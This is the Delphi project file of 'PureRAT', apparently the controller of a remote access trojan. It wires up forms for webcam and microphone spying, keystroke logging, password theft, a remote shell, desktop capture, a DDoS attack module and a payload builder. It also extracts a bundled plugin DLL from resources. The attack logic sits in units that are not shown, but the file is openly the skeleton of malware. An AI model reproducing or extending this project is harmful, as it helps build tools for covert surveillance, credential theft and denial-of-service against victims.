program PureRAT;

uses
  Windows,
  Forms,
  Classes,
  SysUtils,
  UnitMain in 'UnitMain.pas' {FormMain},
  UnitSelectPorts in 'UnitSelectPorts.pas' {FormSelectPorts},
  ZLibEx in 'ZLibEx\ZLibEx.pas',
  GeoIP in 'Units\GeoIP.pas',
  UnitConnection in 'Units\UnitConnection.pas',
  UnitConstants in 'Units\UnitConstants.pas',
  UnitRepository in 'Units\UnitRepository.pas',
  UnitStringCompression in 'Units\UnitStringCompression.pas',
  UnitStringEncryption in 'Units\UnitStringEncryption.pas',
  UnitSettings in 'UnitSettings.pas' {FormSettings},
  UnitCountry in 'Units\UnitCountry.pas',
  UnitNotification in 'UnitNotification.pas' {FormNotification},
  UnitConnectionsLog in 'UnitConnectionsLog.pas' {FormConnectionsLog},
  UnitDisclamer in 'UnitDisclamer.pas' {FormDisclamer},
  UnitAbout in 'UnitAbout.pas' {FormAbout},
  UnitBuilder in 'UnitBuilder.pas' {FormBuilder},
  UnitTransfersManager in 'UnitTransfersManager.pas' {FormTransfersManager},
  UnitFunctions in 'Units\UnitFunctions.pas',
  UnitMoreInfos in 'UnitMoreInfos.pas' {FormMoreInfos},
  UnitTasksManager in 'UnitTasksManager.pas' {FormTasksManager},
  UnitFilesManager in 'UnitFilesManager.pas' {FormFilesManager},
  UnitRegistryEditor in 'UnitRegistryEditor.pas' {FormRegistryEditor},
  UnitShell in 'UnitShell.pas' {FormShell},
  UnitDesktop in 'UnitDesktop.pas' {FormDesktop},
  UnitWebcam in 'UnitWebcam.pas' {FormWebcam},
  UnitMicrophone in 'UnitMicrophone.pas' {FormMicrophone},
  UnitKeyboardInputs in 'UnitKeyboardInputs.pas' {FormKeyboardInputs},
  UnitPasswords in 'UnitPasswords.pas' {FormPasswords},
  UnitChat in 'UnitChat.pas' {FormChat},
  UnitMiscellaneous in 'UnitMiscellaneous.pas' {FormMiscellaneous},
  UnitPortSniffer in 'UnitPortSniffer.pas' {FormPortSniffer},
  UnitPortScanner in 'UnitPortScanner.pas' {FormPortScanner},
  UnitScripts in 'UnitScripts.pas' {FormScripts},
  UnitServicesManager in 'UnitServicesManager.pas' {FormServicesManager},
  UnitProgressBar in 'UnitProgressBar.pas' {FormProgressBar},
  UnitFtpManager in 'UnitFtpManager.pas' {FormFTPManager},
  UnitRegistryManager in 'UnitRegistryManager.pas' {FormRegistryManager},
  ACMConvertor in 'ACM\ACMConvertor.pas',
  ACMIn in 'ACM\ACMIn.pas',
  ACMOut in 'ACM\ACMOut.pas',
  ListUnit in 'ACM\ListUnit.pas',
  MSAcm in 'ACM\MSACM.pas',
  UnitDdosAttack in 'UnitDdosAttack.pas' {FormDdosAttack},
  UnitIconChanger in 'Units\UnitIconChanger.pas',
  uftp in 'Units\uftp.pas';

{$R *.res}
{$R 'Resources\Resources.res' 'Resources\Resources.rc'}
{$R Resources\sound.RES}

var
  TmpRes: TResourceStream;
  TmpStr: string;

begin
  CreateMutex(nil, False, PChar(PROGRAMNAME + ' ' + PROGRAMVERSION));
  if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0);
  
  TmpStr := ExtractFilePath(ParamStr(0)) + 'GeoIP.dat';
  if not FileExists(TmpStr) then
  begin
    TmpRes := TResourceStream.Create(HInstance, 'GEOIP', 'geoipfile');
    TmpRes.SaveToFile(TmpStr);
    TmpRes.Free;
  end;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Connections Logs';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Skins';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Plugin';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
  TmpStr := TmpStr + '\plugin.dll';
  if not FileExists(TmpStr) then
  begin
    TmpRes := TResourceStream.Create(HInstance, 'PLUGIN', 'pluginfile');
    TmpRes.SaveToFile(TmpStr);
    TmpRes.Free;
  end;

  if ReadKeyString(HKEY_CURRENT_USER, 'Software\PureRAT', 'Disclamer', '') <> 'Agree' then
  begin
    FormDisclamer := TFormDisclamer.Create(nil);
    if FormDisclamer.ShowModal <> IDOK then ExitProcess(0);
    if FormDisclamer.chk1.Checked then
    CreateKeyString(HKEY_CURRENT_USER, 'Software\PureRAT', 'Disclamer', 'Agree');
    FormDisclamer.Release;
    FormDisclamer := nil;
  end;
     
  Application.Initialize;
  Application.Title := 'PureRAT';
  Application.CreateForm(TFormMain, FormMain);
  Application.CreateForm(TFormSelectPorts, FormSelectPorts);
  Application.CreateForm(TFormSettings, FormSettings);
  Application.CreateForm(TFormNotification, FormNotification);
  Application.CreateForm(TFormConnectionsLog, FormConnectionsLog);
  Application.CreateForm(TFormDisclamer, FormDisclamer);
  Application.CreateForm(TFormAbout, FormAbout);
  Application.CreateForm(TFormBuilder, FormBuilder);
  Application.CreateForm(TFormTransfersManager, FormTransfersManager);
  Application.CreateForm(TFormMoreInfos, FormMoreInfos);
  Application.CreateForm(TFormTasksManager, FormTasksManager);
  Application.CreateForm(TFormFilesManager, FormFilesManager);
  Application.CreateForm(TFormRegistryEditor, FormRegistryEditor);
  Application.CreateForm(TFormShell, FormShell);
  Application.CreateForm(TFormDesktop, FormDesktop);
  Application.CreateForm(TFormWebcam, FormWebcam);
  Application.CreateForm(TFormMicrophone, FormMicrophone);
  Application.CreateForm(TFormKeyboardInputs, FormKeyboardInputs);
  Application.CreateForm(TFormPasswords, FormPasswords);
  Application.CreateForm(TFormChat, FormChat);
  Application.CreateForm(TFormMiscellaneous, FormMiscellaneous);
  Application.CreateForm(TFormPortSniffer, FormPortSniffer);
  Application.CreateForm(TFormPortScanner, FormPortScanner);
  Application.CreateForm(TFormScripts, FormScripts);
  Application.CreateForm(TFormServicesManager, FormServicesManager);
  Application.CreateForm(TFormProgressBar, FormProgressBar);
  Application.CreateForm(TFormFTPManager, FormFTPManager);
  Application.CreateForm(TFormRegistryManager, FormRegistryManager);
  Application.CreateForm(TFormDdosAttack, FormDdosAttack);
  Application.Run;
end.
